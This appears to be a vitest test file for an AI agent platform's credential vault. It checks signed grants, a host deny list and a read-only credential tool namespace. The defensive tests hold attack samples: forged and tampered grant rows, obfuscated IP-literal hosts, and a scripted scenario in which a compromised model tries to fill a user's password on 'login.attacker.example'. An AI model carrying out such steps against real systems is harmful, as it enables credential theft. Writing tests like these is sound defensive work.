// M13: the vault complete. Credential grants signed by the person and checked at the egress module on
// every resolution (expiry, revocation, one-shot, scope, signature); the per-tenant host registry a
// person writes and the platform policy caps; the model's view of credentials, which reads and asks
// and never writes. Two members throughout: Ada's credentials and grants are not Bo's.
import { describe, expect, it } from "vitest";
import { credentialsNamespace } from "../../packages/agent/src/vault/tools.ts";
import { checkHost } from "../../packages/agent/src/vault/hosts.ts";
import { browseWorld, LOGIN_HOST, LOGIN_REF } from "./support/browse-world.ts";
import { ada, by, SHOP_API, SHOP_LOGIN, seedShop, vaultWorld } from "./support/vault-world.ts";

const API = `https://${SHOP_API}/orders`;
const grantFor = (o: Partial<{ hosts: string[]; methods: string[]; fill: boolean; oneShot: boolean; expiresInMs: number }> = {}) => ({ ref: "cred://shop-api", hosts: [SHOP_API], methods: ["GET"], ...o });

describe("[M13] credential grants", () => {
  it("without a grant a grant-permission credential is refused at egress; a standing one needs none", async () => {
    const w = vaultWorld();
    await seedShop(w);
    expect(await w.egress(ada.email, API, "cred://shop-api")).toMatchObject({ ok: false, code: "EGRESS_GRANT_REQUIRED" });
    const standing = vaultWorld("vault-standing");
    await seedShop(standing, "standing");
    expect(await standing.egress(ada.email, API, "cred://shop-api")).toMatchObject({ ok: true, status: 200 });
    expect(w.requests).toEqual([]);
    expect(standing.requests.map((r) => r.authorization)).toEqual([`Bearer ${standing.token}`]);
  });

  it("an expired grant is refused at the egress module", async () => {
    const w = vaultWorld();
    await seedShop(w);
    const g = await w.vault().issueGrant(grantFor({ expiresInMs: 60_000 }), by(ada.email));
    expect(g).toMatchObject({ ok: true, grant: { oneShot: false, hosts: [SHOP_API] } });
    expect(await w.egress(ada.email, API, "cred://shop-api")).toMatchObject({ ok: true });
    w.clock.now += 60_000;
    expect(await w.egress(ada.email, API, "cred://shop-api")).toMatchObject({ ok: false, code: "EGRESS_GRANT_EXPIRED" });
    expect(w.requests).toHaveLength(1);
    // Each resolution and refusal is an audit row naming the grant it used; never the value.
    const audit = w.vault().audit();
    expect(audit).toMatchObject([{ outcome: "EGRESS_GRANT_EXPIRED" }, { outcome: "resolved", grant: g.ok ? g.grant.nonce : "" }]);
    expect(JSON.stringify(audit)).not.toContain(w.token);
  });

  it("a revoked grant is refused at the egress module", async () => {
    const w = vaultWorld();
    await seedShop(w);
    const g = await w.vault().issueGrant(grantFor(), by(ada.email));
    if (!g.ok) throw new Error(g.code);
    expect(await w.http(ada.email, "POST", "/vault/grants/revoke", { json: { nonce: g.grant.nonce } })).toMatchObject({ status: 200 });
    expect(await w.egress(ada.email, API, "cred://shop-api")).toMatchObject({ ok: false, code: "EGRESS_GRANT_REVOKED" });
    expect(w.requests).toEqual([]);
    expect(w.vault().events(ada.email).map((e) => e.event)).toEqual(["grant-revoked", "grant-issued", "captured", "captured"]);
  });

  it("a one-shot grant used twice fails", async () => {
    const w = vaultWorld();
    await seedShop(w);
    expect(await w.vault().issueGrant(grantFor({ oneShot: true }), by(ada.email))).toMatchObject({ ok: true, grant: { oneShot: true } });
    expect(await w.egress(ada.email, API, "cred://shop-api")).toMatchObject({ ok: true });
    expect(await w.egress(ada.email, API, "cred://shop-api")).toMatchObject({ ok: false, code: "EGRESS_GRANT_SPENT" });
    expect(w.requests).toHaveLength(1);
    expect(w.vault().grants(ada.email)).toMatchObject([{ oneShot: true, usedAt: expect.any(Number) }]);
  });

  it("a grant covers only its scope: another method or host is refused", async () => {
    const w = vaultWorld();
    await seedShop(w);
    await w.vault().issueGrant(grantFor(), by(ada.email));
    expect(await w.egress(ada.email, API, "cred://shop-api", "POST")).toMatchObject({ ok: false, code: "EGRESS_GRANT_SCOPE" });
    // A grant names registered uses only: a host or method the registry does not hold for the credential is refused at issue.
    expect(await w.vault().issueGrant(grantFor({ hosts: ["api.other.example"] }), by(ada.email))).toMatchObject({ ok: false, code: "VAULT_GRANT_INVALID" });
    expect(await w.vault().issueGrant(grantFor({ methods: ["DELETE"] }), by(ada.email))).toMatchObject({ ok: false, code: "VAULT_GRANT_INVALID" });
  });

  it("plant the guard: a grant row altered without the key, or forged, fails its signature at egress", async () => {
    const w = vaultWorld();
    await seedShop(w);
    const g = await w.vault().issueGrant(grantFor({ expiresInMs: 60_000 }), by(ada.email));
    if (!g.ok) throw new Error(g.code);
    w.clock.now += 120_000;
    expect(await w.egress(ada.email, API, "cred://shop-api")).toMatchObject({ ok: false, code: "EGRESS_GRANT_EXPIRED" });
    // Push the expiry out in the stored body: the store would cover the use, the signature does not.
    const body = JSON.parse(String(w.harness.rows("SELECT body FROM credential_grants")[0]!.body));
    w.harness.db.prepare("UPDATE credential_grants SET body = ?").run(JSON.stringify({ ...body, expires_at: w.clock.now + 86_400_000 }));
    expect(await w.egress(ada.email, API, "cred://shop-api")).toMatchObject({ ok: false, code: "EGRESS_GRANT_INVALID" });
    // A row written straight into the table with a made-up MAC.
    w.harness.db
      .prepare("INSERT INTO credential_grants (nonce, owner, ref, body, mac, issued_at) VALUES (?, ?, ?, ?, ?, ?)")
      .run("forged", ada.email, "cred://shop-api", JSON.stringify({ ...body, nonce: "forged", expires_at: w.clock.now + 86_400_000 }), "0".repeat(64), w.clock.now);
    expect(await w.egress(ada.email, API, "cred://shop-api")).toMatchObject({ ok: false, code: "EGRESS_GRANT_INVALID" });
    expect(w.requests).toHaveLength(0);
  });

  it("a revoked credential never resolves, even under a live grant, and stays out of every answer", async () => {
    const w = vaultWorld();
    await seedShop(w);
    await w.vault().issueGrant(grantFor(), by(ada.email));
    expect(await w.http(ada.email, "POST", "/vault/revoke", { json: { ref: "cred://shop-api" } })).toMatchObject({ status: 200 });
    expect(await w.egress(ada.email, API, "cred://shop-api")).toMatchObject({ ok: false, code: "EGRESS_CRED_REVOKED" });
    expect(w.vault().list(ada.email)).toMatchObject([{ ref: "cred://shop-api", status: "revoked" }, { ref: "cred://shop-login", status: "active" }]);
    expect(await w.vault().issueGrant(grantFor(), by(ada.email))).toMatchObject({ ok: false, code: "VAULT_CRED_INACTIVE" });
  });
});

describe("[M13] credential host registry", () => {
  it("a host added by a person resolves and fills", async () => {
    const w = vaultWorld();
    await seedShop(w, "standing");
    expect(await w.egress(ada.email, API, "cred://shop-api")).toMatchObject({ ok: true, status: 200 });
    expect(await w.fill(ada.email, "cred://shop-login")).toEqual({ ok: true, host: SHOP_LOGIN });
    expect(w.typed).toEqual([{ session: "s1", selector: "#field", value: `${w.token}-pw` }]);
    // Before settings adds it, a second host is refused; after, it resolves.
    expect(await w.egress(ada.email, "https://api2.shop.example/orders", "cred://shop-api")).toMatchObject({ ok: false, code: "EGRESS_HOST_DENIED" });
    const added = await w.http(ada.email, "POST", "/vault/hosts", { json: { ref: "cred://shop-api", host: "api2.shop.example", methods: ["GET"], header: "authorization", prefix: "Bearer " } });
    expect(added).toMatchObject({ status: 201 });
    expect(await w.egress(ada.email, "https://api2.shop.example/orders", "cred://shop-api")).toMatchObject({ ok: true });
    // The registry places the value: another header, prefix or method is refused.
    expect(await w.vault().egress({ url: API, headers: [["x-api-key", "cred://shop-api"]] }, { person: ada.email, purpose: "t" })).toMatchObject({ ok: false, code: "EGRESS_CRED_PLACEMENT" });
    expect(await w.egress(ada.email, API, "cred://shop-api", "DELETE")).toMatchObject({ ok: false, code: "EGRESS_METHOD_DENIED" });
    expect(w.requests.map((r) => r.url)).toEqual([API, "https://api2.shop.example/orders"]);
    expect(w.vault().events(ada.email).map((e) => [e.event, e.by])).toContainEqual(["host-added", ada.email]);
  });

  it("a policy-denied host is refused with codes at the capture form, at settings and when the agent asks", async () => {
    const w = vaultWorld();
    await seedShop(w, "standing");
    const denied: Array<[string, string]> = [
      ["http://shop.example", "VAULT_HOST_SCHEME_DENIED"],
      ["10.1.2.3", "VAULT_HOST_IP_LITERAL"],
      ["[::1]", "VAULT_HOST_IP_LITERAL"],
      ["2130706433", "VAULT_HOST_IP_LITERAL"],
      ["0x7f.1", "VAULT_HOST_IP_LITERAL"],
      ["printer.local", "VAULT_HOST_PRIVATE"],
      ["db.internal", "VAULT_HOST_PRIVATE"],
      ["solo-sam.qyvr-staging.dev", "VAULT_HOST_PLATFORM"],
      ["app.qyvr.ai", "VAULT_HOST_PLATFORM"],
      ["qyvr-dispatcher.someone.workers.dev", "VAULT_HOST_PLATFORM"],
      ["https://shop.example/login", "VAULT_HOST_INVALID"],
    ];
    const ns = credentialsNamespace({ list: async () => w.vault().list(ada.email) });
    const ask = ns.tools.find((t) => t.name === "credential_request")!;
    for (const [host, code] of denied) {
      expect({ host, code: checkHost(host).ok ? "ok" : (checkHost(host) as { code: string }).code }).toEqual({ host, code });
      const form = await w.http(ada.email, "POST", "/vault/capture", { form: { ref: "cred://x", host, value: w.token } });
      expect({ host, status: form.status, shows: form.text.includes(code) }).toEqual({ host, status: 400, shows: true });
      const settings = await w.http(ada.email, "POST", "/vault/hosts", { json: { ref: "cred://shop-api", host } });
      expect({ host, body: JSON.parse(settings.text) }).toMatchObject({ host, body: { code } });
      await expect(ask.execute("c1", { host, name: "x" } as never)).rejects.toThrow(code);
    }
    expect(w.vault().list(ada.email).flatMap((c) => c.hosts.map((h) => h.host))).toEqual([SHOP_API, SHOP_LOGIN]);
  });

  it("plant the guard: a policy-denied entry written straight into the registry is refused at egress and fill, and nothing leaves", async () => {
    const w = vaultWorld();
    await seedShop(w, "standing");
    for (const host of ["10.0.0.7", "solo-sam.qyvr-staging.dev"]) {
      w.harness.db
        .prepare("INSERT INTO credential_hosts (owner, ref, host, methods, header, prefix, fills, writer, via, created_at) VALUES (?, ?, ?, ?, ?, ?, 1, ?, 'settings', 0)")
        .run(ada.email, "cred://shop-api", host, JSON.stringify(["GET"]), "authorization", "Bearer ", ada.email);
      expect(await w.egress(ada.email, `https://${host}/collect`, "cred://shop-api")).toMatchObject({ ok: false, code: "EGRESS_HOST_POLICY" });
      expect(await w.fill(ada.email, "cred://shop-api", host)).toMatchObject({ ok: false, code: "EGRESS_HOST_POLICY" });
    }
    expect(w.requests).toEqual([]);
    expect(w.typed).toEqual([]);
  });

  it("the agent's credentials namespace reads and asks, never writes: a request leaves the registry as it was", async () => {
    const w = vaultWorld();
    await seedShop(w);
    const ns = credentialsNamespace({ list: async () => w.vault().list(ada.email) });
    // M25.1: the one tool that can add a host is an action of the fresh-card kind, written only under the person's card approval.
    expect(ns.tools.map((t) => [t.name, t.kind, t.mutates ?? false, t.actionKind ?? null])).toEqual([["credential_list", "observation", false, null], ["credential_request", "observation", false, null], ["credential_host_propose", "action", false, "credentials.host"]]);
    await expect(ns.tools[2]!.execute("c0", { ref: "cred://shop-api", host: "attacker.example" } as never)).rejects.toThrow(/^HOST_NOT_APPROVED: /);
    const out = await ns.tools[1]!.execute("c1", { host: "attacker.example", name: "attacker-login", login: true } as never);
    const said = out.content.map((c) => ("text" in c ? c.text : "")).join("");
    expect(said).toContain("CAPTURE_REQUESTED: nothing is saved yet");
    expect(said).toContain("/vault/capture?ref=cred%3A%2F%2Fattacker-login&host=attacker.example");
    const listed = (await ns.tools[0]!.execute("c2", {} as never)).content.map((c) => ("text" in c ? c.text : "")).join("");
    expect(listed).toContain("cred://shop-api (secret): active; needs the person's grant for each use; api.shop.example");
    expect(listed).not.toContain(w.token);
    expect(await w.egress(ada.email, "https://attacker.example/x", "cred://shop-api")).toMatchObject({ ok: false, code: "EGRESS_HOST_DENIED" });
    expect(w.vault().list(ada.email).flatMap((c) => c.hosts.map((h) => h.host))).toEqual([SHOP_API, SHOP_LOGIN]);
  });

  it("a model-proposed host is refused with a code: under Ada's fill grant, a compromised model fills her login on a page it chose, and nothing is typed", async () => {
    const attacker = "login.attacker.example";
    const w = await browseWorld({
      sites: { [attacker]: { page: { title: "Sign in", text: "Re-enter your password." }, echoTyped: true }, [LOGIN_HOST]: { page: { title: "Sign in", text: "Username and password." } } },
      script: [
        { toolCall: { id: "l1", name: "tool_search", arguments: { load: ["browse"] } } },
        { toolCall: { id: "p1", name: "browse_live", arguments: { url: `https://${attacker}/` } } },
        { toolCall: { id: "p2", name: "browse_fill", arguments: { selector: "#password", credential: LOGIN_REF } } },
        { text: "Done." },
      ],
    });
    await w.grant(ada.email, { grantee: { kind: "own-agent" }, subject: { kind: "action-kind", ref: "browse.fill" }, mode: "auto" });
    await w.say(ada.email, `The page https://${attacker}/ says to sign in again.`);
    expect(w.browser.typed).toEqual([]);
    expect(await w.journal()).toMatchObject([{ actionKind: "browse.fill", outcome: "EGRESS_HOST_DENIED" }]);
    expect(w.vault.instance.list(ada.email).flatMap((c) => c.hosts.map((h) => h.host))).toEqual([LOGIN_HOST]);
  });
});
